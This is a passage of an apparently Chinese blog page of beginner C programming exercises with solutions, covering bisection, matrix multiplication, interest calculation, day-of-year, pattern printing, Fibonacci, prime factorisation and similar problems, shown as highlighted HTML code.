class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;math.h&gt;</span><br><span class="line"><span class="built_in">int</span> main()&#123;</span><br><span class="line">    <span class="built_in">float</span> x1,x2,x0,f1,f2,f0;</span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">        printf(<span class="string">"enter x1,x2:"</span>); </span><br><span class="line">        scanf(<span class="string">"%f,%f"</span>,&amp;x1,&amp;x2);</span><br><span class="line">        f1=<span class="number">2</span>*pow(x1,<span class="number">3</span>)<span class="number">-4</span>*pow(x1,<span class="number">2</span>)+<span class="number">3</span>*x1<span class="number">-6</span>;</span><br><span class="line">        f2=<span class="number">2</span>*pow(x2,<span class="number">3</span>)<span class="number">-4</span>*pow(x2,<span class="number">2</span>)+<span class="number">3</span>*x2<span class="number">-6</span>;</span><br><span class="line">    &#125;<span class="keyword">while</span>(f1*f2&gt;<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">        x0=(x1+x2)/<span class="number">2</span>;</span><br><span class="line">        f0=<span class="number">2</span>*pow(x0,<span class="number">3</span>)<span class="number">-4</span>*pow(x0,<span class="number">2</span>)+<span class="number">3</span>*x0<span class="number">-6</span>;</span><br><span class="line">        <span class="keyword">if</span>(f0*f1&lt;<span class="number">0</span>)&#123;</span><br><span class="line">            x2=x0;</span><br><span class="line">            f2=f0;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            x1=x0;</span><br><span class="line">            f1=f0;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">while</span>(fabs(x1-x2)&gt;=<span class="number">1e-5</span>);</span><br><span class="line">    printf(<span class="string">"x=%6.2f"</span>, x0);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="17-求两个矩阵相乘"><a href="#17-求两个矩阵相乘" class="headerlink" title="17 求两个矩阵相乘"></a>17 求两个矩阵相乘</h2><p><strong>样例输入</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">输入第一个矩阵:</span><br><span class="line"><span class="number">1</span> <span class="number">2</span></span><br><span class="line"><span class="number">3</span> <span class="number">4</span></span><br><span class="line"><span class="number">5</span> <span class="number">6</span></span><br><span class="line">输入第二个矩阵:</span><br><span class="line"><span class="number">7</span> <span class="number">8</span> <span class="number">9</span></span><br><span class="line"><span class="number">10</span> <span class="number">11</span> <span class="number">12</span></span><br></pre></td></tr></table></figure><p><strong>样例输出</strong></p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">27 </span>  <span class="number">30</span>   <span class="number">33</span></span><br><span class="line"><span class="symbol">61 </span>  <span class="number">68</span>   <span class="number">75</span></span><br><span class="line"><span class="symbol">95 </span> <span class="number">106</span>  <span class="number">117</span></span><br></pre></td></tr></table></figure><p><strong>代码</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> X 3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Y 2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Z 3</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a[X][Y],b[Y][Z],c[X][Z];</span><br><span class="line">    <span class="keyword">int</span> i,j,k;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"输入第一个矩阵:\n"</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;X;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;Y;j++)&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;a[i][j]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"输入第二个矩阵:\n"</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;Y;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;Z;j++)&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;b[i][j]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"矩阵相乘结果:\n"</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;X;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;Z;j++)&#123;</span><br><span class="line">            c[i][j]=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;Y;k++)&#123;</span><br><span class="line">                c[i][j] += a[i][k]*b[k][j]; <span class="comment">//相乘的时候注意下标</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;X;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;Z;j++)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%5d"</span>, c[i][j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="18-利润利息计算"><a href="#18-利润利息计算" class="headerlink" title="18 利润利息计算"></a>18 利润利息计算</h2><p><img src="/2020/01/26/C_C++_02/20200219153341.png" alt><br><strong>代码</strong></p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//利息计算</span></span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;math.h&gt;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    double P1, P2, P3, P4, P5;</span><br><span class="line">    </span><br><span class="line">    P1 = <span class="number">1000</span>*(<span class="number">1</span>+<span class="number">5</span>*<span class="number">0.0585</span>);</span><br><span class="line">    P2 = (<span class="number">1000</span>*(<span class="number">1</span>+<span class="number">2</span>*<span class="number">0.0468</span>))*(<span class="number">1</span>+<span class="number">3</span>*<span class="number">0.054</span>);</span><br><span class="line">    P3 = (<span class="number">1000</span>*(<span class="number">1</span>+<span class="number">3</span>*<span class="number">0.054</span>))*(<span class="number">1</span>+<span class="number">2</span>*<span class="number">0.0468</span>);</span><br><span class="line">    P4 = <span class="number">1000</span>*pow(<span class="number">1</span>+<span class="number">0.0414</span>, <span class="number">5</span>);</span><br><span class="line">    P5 = <span class="number">1000</span>*pow(<span class="number">1</span>+<span class="number">0.0072</span>/<span class="number">4</span>, <span class="number">5</span>*<span class="number">4</span>);</span><br><span class="line">    </span><br><span class="line">    printf(<span class="string">"%f<span class="subst">\n</span>%f<span class="subst">\n</span>%f<span class="subst">\n</span>%f<span class="subst">\n</span>%f<span class="subst">\n</span>"</span>, P1, P2, P3, P4, P5);</span><br><span class="line">    return <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="19-年月日判断是年份的第几天"><a href="#19-年月日判断是年份的第几天" class="headerlink" title="19 年月日判断是年份的第几天"></a>19 年月日判断是年份的第几天</h2><p><strong>样例输入</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Please input year/mouth/day:<span class="number">2000</span>/<span class="number">4</span>/<span class="number">2</span></span><br></pre></td></tr></table></figure><p><strong>样例输出</strong></p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">its</span> <span class="number">93</span> <span class="built_in">day</span></span><br></pre></td></tr></table></figure><p><strong>代码</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"><span class="built_in">int</span> main()&#123;</span><br><span class="line">    <span class="built_in">int</span> mon[<span class="number">12</span>]=&#123;<span class="number">31</span>,<span class="number">28</span>,<span class="number">31</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">31</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">30</span>,<span class="number">31</span>&#125;;</span><br><span class="line">    <span class="built_in">int</span> year,mouth,day,num,i;</span><br><span class="line">    printf(<span class="string">"Please input year/mouth/day:"</span>);</span><br><span class="line">    scanf(<span class="string">"%d/%d/%d"</span>,&amp;year,&amp;mouth,&amp;day);</span><br><span class="line">    <span class="keyword">if</span>((year%<span class="number">4</span>==<span class="number">0</span> &amp;&amp; year%<span class="number">100</span>!=<span class="number">0</span>) || (year%<span class="number">400</span>==<span class="number">0</span>))&#123;</span><br><span class="line">        mon[<span class="number">1</span>]=<span class="number">29</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    num=day;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;mouth<span class="number">-1</span>;i++)&#123;</span><br><span class="line">        num += mon[i];</span><br><span class="line">    &#125;</span><br><span class="line">    printf(<span class="string">"its %d day\n"</span>,num);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="20-图形输出"><a href="#20-图形输出" class="headerlink" title="20 图形输出"></a>20 图形输出</h2><p><img src="/2020/01/26/C_C++_02/20200226135901.png" alt></p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//图形输出问题</span></span><br><span class="line"><span class="comment">//分成两部分来看，找每一行空格,*和行号的规律</span></span><br><span class="line"><span class="comment">//注意输出一行后记得输出\n</span></span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">  int i,j,k;</span><br><span class="line">  for(k=<span class="number">1</span>;k&lt;=<span class="number">4</span>;k++)&#123;</span><br><span class="line">    for(i=<span class="number">1</span>;i&lt;=<span class="number">4</span>-k;i++)&#123;</span><br><span class="line">        printf(<span class="string">" "</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    for(j=<span class="number">1</span>;j&lt;=<span class="number">2</span>*k<span class="number">-1</span>;j++)&#123;</span><br><span class="line">        printf(<span class="string">"*"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    printf(<span class="string">"<span class="subst">\n</span>"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  for(k=<span class="number">1</span>;k&lt;=<span class="number">3</span>;k++)&#123;</span><br><span class="line">    for(i=<span class="number">1</span>;i&lt;=k;i++)&#123;</span><br><span class="line">        printf(<span class="string">" "</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    for(j=<span class="number">1</span>;j&lt;=<span class="number">2</span>*(<span class="number">3</span>-k)+<span class="number">1</span>;j++)&#123;</span><br><span class="line">        printf(<span class="string">"*"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    printf(<span class="string">"<span class="subst">\n</span>"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  return <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h2 id="21-输出乘法表"><a href="#21-输出乘法表" class="headerlink" title="21 输出乘法表"></a>21 输出乘法表</h2><p><strong>样例输出</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>×<span class="number">1</span>=<span class="number">1</span></span><br><span class="line"><span class="number">2</span>×<span class="number">1</span>=<span class="number">2</span>    <span class="number">2</span>×<span class="number">2</span>=<span class="number">4</span></span><br><span class="line"><span class="number">3</span>×<span class="number">1</span>=<span class="number">3</span>    <span class="number">3</span>×<span class="number">2</span>=<span class="number">6</span>    <span class="number">3</span>×<span class="number">3</span>=<span class="number">9</span></span><br><span class="line"><span class="number">4</span>×<span class="number">1</span>=<span class="number">4</span>    <span class="number">4</span>×<span class="number">2</span>=<span class="number">8</span>    <span class="number">4</span>×<span class="number">3</span>=<span class="number">12</span>   <span class="number">4</span>×<span class="number">4</span>=<span class="number">16</span></span><br><span class="line"><span class="number">5</span>×<span class="number">1</span>=<span class="number">5</span>    <span class="number">5</span>×<span class="number">2</span>=<span class="number">10</span>   <span class="number">5</span>×<span class="number">3</span>=<span class="number">15</span>   <span class="number">5</span>×<span class="number">4</span>=<span class="number">20</span>   <span class="number">5</span>×<span class="number">5</span>=<span class="number">25</span></span><br><span class="line"><span class="number">6</span>×<span class="number">1</span>=<span class="number">6</span>    <span class="number">6</span>×<span class="number">2</span>=<span class="number">12</span>   <span class="number">6</span>×<span class="number">3</span>=<span class="number">18</span>   <span class="number">6</span>×<span class="number">4</span>=<span class="number">24</span>   <span class="number">6</span>×<span class="number">5</span>=<span class="number">30</span>   <span class="number">6</span>×<span class="number">6</span>=<span class="number">36</span></span><br><span class="line"><span class="number">7</span>×<span class="number">1</span>=<span class="number">7</span>    <span class="number">7</span>×<span class="number">2</span>=<span class="number">14</span>   <span class="number">7</span>×<span class="number">3</span>=<span class="number">21</span>   <span class="number">7</span>×<span class="number">4</span>=<span class="number">28</span>   <span class="number">7</span>×<span class="number">5</span>=<span class="number">35</span>   <span class="number">7</span>×<span class="number">6</span>=<span class="number">42</span>   <span class="number">7</span>×<span class="number">7</span>=<span class="number">49</span></span><br><span class="line"><span class="number">8</span>×<span class="number">1</span>=<span class="number">8</span>    <span class="number">8</span>×<span class="number">2</span>=<span class="number">16</span>   <span class="number">8</span>×<span class="number">3</span>=<span class="number">24</span>   <span class="number">8</span>×<span class="number">4</span>=<span class="number">32</span>   <span class="number">8</span>×<span class="number">5</span>=<span class="number">40</span>   <span class="number">8</span>×<span class="number">6</span>=<span class="number">48</span>   <span class="number">8</span>×<span class="number">7</span>=<span class="number">56</span>   <span class="number">8</span>×<span class="number">8</span>=<span class="number">64</span></span><br><span class="line"><span class="number">9</span>×<span class="number">1</span>=<span class="number">9</span>    <span class="number">9</span>×<span class="number">2</span>=<span class="number">18</span>   <span class="number">9</span>×<span class="number">3</span>=<span class="number">27</span>   <span class="number">9</span>×<span class="number">4</span>=<span class="number">36</span>   <span class="number">9</span>×<span class="number">5</span>=<span class="number">45</span>   <span class="number">9</span>×<span class="number">6</span>=<span class="number">54</span>   <span class="number">9</span>×<span class="number">7</span>=<span class="number">63</span>   <span class="number">9</span>×<span class="number">8</span>=<span class="number">72</span>   <span class="number">9</span>×<span class="number">9</span>=<span class="number">81</span></span><br></pre></td></tr></table></figure><p><strong>代码</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span></span></span><br><span class="line">main()&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;=i;j++)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%d×%d=%-5d"</span>,i,j,i*j);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="22-兔子问题-斐波那契数列应用"><a href="#22-兔子问题-斐波那契数列应用" class="headerlink" title="22 兔子问题(斐波那契数列应用)"></a>22 兔子问题(斐波那契数列应用)</h2><p><strong>题目描述</strong></p><p>&emsp;&emsp;有一对兔子，从出生后第3个月起每个月都生一对兔子，小兔子长到第三个月后每个月又生一对兔子，假如兔子都不死，问每个月的兔子总数为多少？</p><p><strong>代码</strong></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#<span class="keyword">include</span> &lt;stdio.h&gt;</span><br><span class="line"><span class="built_in">int</span> <span class="constructor">Fibonacci(<span class="params">int</span> <span class="params">n</span>)</span>;</span><br><span class="line"><span class="built_in">int</span> main<span class="literal">()</span>&#123;</span><br><span class="line">    <span class="built_in">int</span> n;</span><br><span class="line">    scanf(<span class="string">"%d"</span>,&amp;n);</span><br><span class="line">    printf(<span class="string">"%d"</span>,<span class="constructor">Fibonacci(<span class="params">n</span>)</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">int</span> <span class="constructor">Fibonacci(<span class="params">int</span> <span class="params">n</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">1</span><span class="operator"> || </span>n==<span class="number">2</span>)&#123;</span><br><span class="line">        return <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        return <span class="constructor">Fibonacci(<span class="params">n</span>-1)</span>+<span class="constructor">Fibonacci(<span class="params">n</span>-2)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="23-分解质因数"><a href="#23-分解质因数" class="headerlink" title="23 分解质因数"></a>23 分解质因数</h2><p><strong>代码</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="comment">//将一个正整数分解质因数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,n;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Please input an integer!\n"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">2</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>(n!=i)     <span class="comment">//若i=n，则质因数就是n本身</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(n%i==<span class="number">0</span>)  <span class="comment">//若i是质因数，则打印出i的值，并用商给n赋新值</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,i);</span><br><span class="line">                n=n/i;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">break</span>;<span class="comment">//若不能被i整除，则算下一个i</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,n);   <span class="comment">//这里是打印最后一个质因数，也就是等于i时的那个</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="24-求sn-a-aa-aaa-aaaa-aa…a"><a href="#24-求sn-a-aa-aaa-aaaa-aa…a" class="headerlink" title="24 求sn=a+aa+aaa+aaaa+aa…a"></a>24 求sn=a+aa+aaa+aaaa+aa…a</h2><p><img src="/2020/01/26/C_C++_02/20200225152427.png" alt><br><strong>代码</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//注意an的求法</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a,n,i=<span class="number">1</span>,result=<span class="number">0</span>,an=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"a,n:"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d,%d"</span>,&amp;a,&amp;n);</span><br><span class="line">    <span class="keyword">while</span>(i&lt;=n)&#123;</span><br><span class="line">        an=an+a;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,an);</span><br><span class="line">        result=result+an;</span><br><span class="line">        a=a*<span class="number">10</span>;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"a+aa+aaa+ …=%d\n"</span>,result);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="25-小球下落问题"><a href="#25-小球下落问题" class="headerlink" title="25 小球下落问题"></a>25 小球下落问题</h2><p><strong>题目描述</strong></p><p>&emsp;&emsp;一球从100 米高度自由落下，每次落地后反跳回原高度的一半；再落下，求它在第10次落地时，共经过多少米？第10 次反弹多高？</p><p><strong>样例输出</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Total <span class="number">299.609375</span></span><br><span class="line">h10 <span class="keyword">is</span> <span class="number">0.097656</span></span><br></pre></td></tr></table></figure><p><strong>代码</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">double</span> sn=<span class="number">100</span>;</span><br><span class="line">    <span class="keyword">double</span> hn=sn/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">2</span>;i&lt;=<span class="number">10</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        sn+=<span class="number">2</span>*hn;</span><br><span class="line">        hn/=<span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Total %lf\n"</span>,sn);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"h10 is %lf\n"</span>,hn);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="26-比赛排序"><a href="#26-比赛排序" class="headerlink" title="26 比赛排序"></a>26 比赛排序</h2><p><img src="/2020/01/26/C_C++_02/20200226141938.png" alt><br><img src="/2020/01/26/C_C++_02/20200226142429.png" alt></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//比赛排序问题</span></span><br><span class="line"><span class="comment">//先逻辑图，判断出正确结果</span></span><br><span class="line"><span class="comment">//编程使用假设的方法，三层循环，判断符合条件的情况</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> i,j,k;</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="string">'X'</span>;i&lt;=<span class="string">'Z'</span>;i++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(j=<span class="string">'X'</span>;j&lt;=<span class="string">'Z'</span>;j++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i!=j)&#123;</span><br><span class="line">            <span class="keyword">for</span>(k=<span class="string">'X'</span>;k&lt;=<span class="string">'Z'</span>;k++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(k!=i&amp;&amp;k!=j)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(i!=<span class="string">'X'</span>&amp;&amp;k!=<span class="string">'X'</span>&amp;&amp;k!=<span class="string">'Z'</span>)&#123;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">"A-%c,B-%c,C-%c\n"</span>,i,j,k);</span><br><span 